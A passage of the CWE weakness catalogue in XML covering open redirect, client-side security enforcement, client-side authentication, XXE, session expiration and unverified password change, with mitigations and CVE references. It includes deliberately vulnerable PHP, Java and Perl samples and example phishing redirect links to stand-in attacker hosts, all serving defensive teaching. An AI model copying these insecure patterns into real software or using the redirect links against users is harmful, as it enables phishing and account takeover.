                  <xhtml:p>For example, ID 1 could map to "/login.asp" and ID 2 could map to "http://www.example.com/". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that no externally-supplied requests are honored by requiring that all redirect requests include a unique nonce generated by the application [REF-483]. Be sure that the nonce is not predictable (CWE-330).</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code obtains a URL from the query string and then redirects the user to that URL.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$redirect_url = $_GET['url'];<xhtml:br/>header("Location: " . $redirect_url);</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with the above code is that an attacker could use this page as part of a phishing scam by redirecting users to a malicious site. For example, assume the above code is in the file example.php. An attacker could supply a user with the following link:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>http://example.com/example.php?url=http://malicious.example.com</xhtml:div>
               </Example_Code>
               <Body_Text>The user sees the link pointing to the original trusted site (example.com) and does not realize the redirection that could take place.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>public class RedirectServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:div>protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:div style="margin-left:10px;">String query = request.getQueryString();<xhtml:br/>if (query.contains("url")) {<xhtml:div style="margin-left:10px;">String url = request.getParameter("url");<xhtml:br/>response.sendRedirect(url);</xhtml:div>}</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of a e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link:</Body_Text>
               <Example_Code Nature="attack" Language="HTML">
                  <xhtml:div>&lt;a href="http://bank.example.com/redirect?url=http://attacker.example.net"&gt;Click here to log in&lt;/a&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-4206</Reference>
               <Description>URL parameter loads the URL into a frame and causes it to appear to be part of a valid page.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4206</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2951</Reference>
               <Description>An open redirect vulnerability in the search script in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL as a parameter to the proper function.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2052</Reference>
               <Description>Open redirect vulnerability in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the proper parameter.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2052</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>38</Entry_ID>
               <Entry_Name>URl Redirector Abuse</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-483"/>
            <Reference External_Reference_ID="REF-484" Section="Page 43"/>
            <Reference External_Reference_ID="REF-485"/>
            <Reference External_Reference_ID="REF-45"/>
         </References>
         
      </Weakness>
      <Weakness ID="602" Name="Client-Side Enforcement of Server-Side Security" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software is composed of a server that relies on the client to implement a mechanism that is intended to protect the server.</Description>
         <Extended_Description>When the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms resulting in potentially unexpected interactions between the client and server. The consequences will vary, depending on what the mechanisms are trying to protect.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="471" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="290" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="300" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Client Server" Prevalence="Sometimes"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>Consider a product that consists of two or more processes or nodes that must interact closely, such as a client/server model. If the product uses protection schemes in the client in order to defend from attacks against the server, and the server does not use the same schemes, then an attacker could modify the client in a way that bypasses those schemes. This is a fundamental design flaw that is primary to many weaknesses.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Availability</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>Client-side validation checks can be easily bypassed, allowing malformed or unexpected input to pass into the application, potentially as trusted data. This may lead to unexpected states, behaviors and possibly a resulting crash.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Client-side checks for authentication can be easily bypassed, allowing clients to escalate their access levels and perform unintended actions.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</xhtml:p>
                  <xhtml:p>Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If some degree of trust is required between the two entities, then use integrity checking and strong authentication to ensure that the inputs are coming from a trusted source. Design the product so that this trust is managed in a centralized fashion, especially if there are complex or numerous communication channels, in order to reduce the risks that the implementer will mistakenly omit a check in a single code path.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example contains client-side code that checks if the user authenticated successfully before sending a command. The server-side code performs the authentication in one step, and executes the command in a separate step.</Intro_Text>
               <Body_Text>CLIENT-SIDE (client.pl)</Body_Text>
               <Example_Code Nature="good" Language="Perl">
                  <xhtml:div>$server = "server.example.com";<xhtml:br/>$username = AskForUserName();<xhtml:br/>$password = AskForPassword();<xhtml:br/>$address = AskForAddress();<xhtml:br/>$sock = OpenSocket($server, 1234);<xhtml:br/>writeSocket($sock, "AUTH $username $password\n");<xhtml:br/>$resp = readSocket($sock);<xhtml:br/>if ($resp eq "success") {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i># username/pass is valid, go ahead and update the info!</xhtml:i>
                           <xhtml:br/>writeSocket($sock, "CHANGE-ADDRESS $username $address\n";</xhtml:div>
                     </xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:10px;">print "ERROR: Invalid Authentication!\n";</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>SERVER-SIDE (server.pl):</Body_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>$sock = acceptSocket(1234);<xhtml:br/>($cmd, $args) = ParseClientRequest($sock);<xhtml:br/>if ($cmd eq "AUTH") {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>($username, $pass) = split(/\s+/, $args, 2);<xhtml:br/>$result = AuthenticateUser($username, $pass);<xhtml:br/>writeSocket($sock, "$result\n");<xhtml:br/>
                           <xhtml:i># does not close the socket on failure; assumes the</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># user will try again</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>elsif ($cmd eq "CHANGE-ADDRESS") {<xhtml:div style="margin-left:10px;">if (validateAddress($args)) {<xhtml:div style="margin-left:10px;">$res = UpdateDatabaseRecord($username, "address", $args);<xhtml:br/>writeSocket($sock, "SUCCESS\n");</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:10px;">writeSocket($sock, "FAILURE -- address is malformed\n");</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The server accepts 2 commands, "AUTH" which authenticates the user, and "CHANGE-ADDRESS" which updates the address field for the username. The client performs the authentication and only sends a CHANGE-ADDRESS for that user if the authentication succeeds. Because the client has already performed the authentication, the server assumes that the username in the CHANGE-ADDRESS is the same as the authenticated user. An attacker could modify the client by removing the code that sends the "AUTH" command and simply executing the CHANGE-ADDRESS.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2006-6994</Reference>
               <Description>ASP program allows upload of .asp files by bypassing client-side checks.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6994</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-0163</Reference>
               <Description>steganography products embed password information in the carrier file, which can be extracted from a modified client.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0163</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-0164</Reference>
               <Description>steganography products embed password information in the carrier file, which can be extracted from a modified client.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0164</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-0100</Reference>
               <Description>client allows server to modify client's configuration and overwrite arbitrary files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0100</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="162"/>
            <Related_Attack_Pattern CAPEC_ID="202"/>
            <Related_Attack_Pattern CAPEC_ID="207"/>
            <Related_Attack_Pattern CAPEC_ID="208"/>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="383"/>
            <Related_Attack_Pattern CAPEC_ID="384"/>
            <Related_Attack_Pattern CAPEC_ID="385"/>
            <Related_Attack_Pattern CAPEC_ID="386"/>
            <Related_Attack_Pattern CAPEC_ID="387"/>
            <Related_Attack_Pattern CAPEC_ID="388"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 23, &#34;Client-Side Security Is an Oxymoron&#34; Page 687"/>
         </References>
         <Notes>
            <Note Type="Research Gap">Server-side enforcement of client-side security is conceptually likely to occur, but some architectures might have these strong dependencies as part of legitimate behavior, such as thin clients.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="603" Name="Use of Client-Side Authentication" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>A client/server product performs authentication within client code but not in server code, allowing server-side authentication to be bypassed via a modified client that omits the authentication check.</Description>
         <Extended_Description>Client-side authentication is extremely weak and may be breached easily. Any attacker may read the source code and reverse-engineer the authentication mechanism to access parts of the application which would otherwise be protected.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="602" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="300" View_ID="1000"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not rely on client side data. Always perform server side authentication.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2006-0230</Reference>
               <Description>Client-side check for a password allows access to a server using crafted XML requests from a modified client.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0230</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Untrustworthy Credentials&#34;, Page 37"/>
         </References>
         <Notes>
            <Note Type="Maintenance">Note that there is a close relationship between this weakness and CWE-656 (Reliance on Security through Obscurity). If developers do not believe that a user can reverse engineer a client, then they are more likely to choose client-side authentication in the belief that it is safe.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="610" Name="Externally Controlled Reference to a Resource in Another Sphere" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="219"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">This is a general class of weakness, but most research is focused on more specialized cases, such as path traversal (CWE-22) and symlink following (CWE-61). A symbolic link has a name; in general, it appears like any other file in the file system. However, the link includes a reference to another file, often in another directory - perhaps in another sphere of control. Many common library functions that accept filenames will "follow" a symbolic link and use the link's target instead.</Note>
            <Note Type="Maintenance">The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 "Resource Injection," as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the "identifier used to access a system resource" such as a file name or port number, yet it explicitly states that the "resource injection" term does not apply to "path manipulation," which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="611" Name="Improper Restriction of XML External Entity Reference" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.</Description>
         <Extended_Description>
            <xhtml:p>XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing.</xhtml:p>
            <xhtml:p>By submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as "file:///c:/winnt/win.ini" designates (in Windows) the file C:\Winnt\win.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning.</xhtml:p>
            <xhtml:p>Once the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="441" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="XML" Prevalence="Undetermined"/>
            <Paradigm Name="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>XXE</Term>
               <Description>XXE is an acronym used for the term "XML eXternal Entities"</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Note>The software could consume excessive CPU cycles or memory using a URI that points to a large file, or a device that always returns data such as /dev/random. Alternately, the URI could reference a file that contains many nested or recursive entity references to further slow down parsing.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>System Configuration</Phase>
               <Description>Many XML parsers and validators can be configured to disable external entity expansion.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-1306</Reference>
               <Description>A browser control can allow remote attackers to determine the existence of files via Javascript containing XML script.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1306</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5656</Reference>
               <Description>XXE during SVG image conversion</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5656</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-2239</Reference>
               <Description>XXE in PHP application allows reading the application's configuration file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2239</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3489</Reference>
               <Description>XXE in database server</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3489</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-4399</Reference>
               <Description>XXE in rapid web application development framework allows reading arbitrary files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4399</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3363</Reference>
               <Description>XXE via XML-RPC request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3363</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0037</Reference>
               <Description>XXE in office document product using RDF.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0037</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-4107</Reference>
               <Description>XXE in web-based administration tool for database.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4107</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-3322</Reference>
               <Description>XXE in product that performs large-scale data analysis.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3322</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1699</Reference>
               <Description>XXE in XSL stylesheet functionality in a common library used by some web browsers.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1699</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>43</Entry_ID>
               <Entry_Name>XML External Entities</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="221"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-496"/>
            <Reference External_Reference_ID="REF-497"/>
            <Reference External_Reference_ID="REF-498"/>
            <Reference External_Reference_ID="REF-499"/>
            <Reference External_Reference_ID="REF-500"/>
            <Reference External_Reference_ID="REF-501"/>
         </References>
         <Notes>
            <Note Type="Relationship">CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the "Server" portion of the SSRF acronym does not necessarily apply.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="613" Name="Insufficient Session Expiration" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>According to WASC, "Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization."</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="287" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="287" View_ID="699"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Set sessions/credentials expiration date.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following snippet was taken from a J2EE web.xml deployment descriptor in which the session-timeout parameter is explicitly defined (the default value depends on the container). In this case the value is set to -1, which means that a session will never expire.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>&lt;web-app&gt;<xhtml:div style="margin-left:10px;">
                        <xhtml:div>[...snipped...]<xhtml:br/>
                           <xhtml:br/>&lt;session-config&gt;<xhtml:div style="margin-left:10px;">&lt;session-timeout&gt;-1&lt;/session-timeout&gt;</xhtml:div>&lt;/session-config&gt;</xhtml:div>
                     </xhtml:div>&lt;/web-app&gt;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>47</Entry_ID>
               <Entry_Name>Insufficient Session Expiration</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Other">The lack of proper session expiration may improve the likely success of certain attacks. For example, an attacker may intercept a session ID, possibly via a network sniffer or Cross-site Scripting attack. Although short session expiration times do not help if a stolen token is immediately used, they will protect against ongoing replaying of the session ID. In another scenario, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Insufficient Session Expiration could allow an attacker to use the browser's back button to access web pages previously accessed by the victim.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="620" Name="Unverified Password Change" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication.</Description>
         <Extended_Description>This could be used by an attacker to change passwords for another user, thus gaining the privileges associated with that user.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>When prompting for a password change, force the user to provide the original password in addition to the new password.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use "forgotten password" functionality. But if you must, ensure that you are only providing information to the actual user, e.g. by using an email address or challenge question that the legitimate user already provided in the past; do not allow the current user to change this identity information until the correct password has been provided.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-56">
               <Intro_Text>This code changes a user's password.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
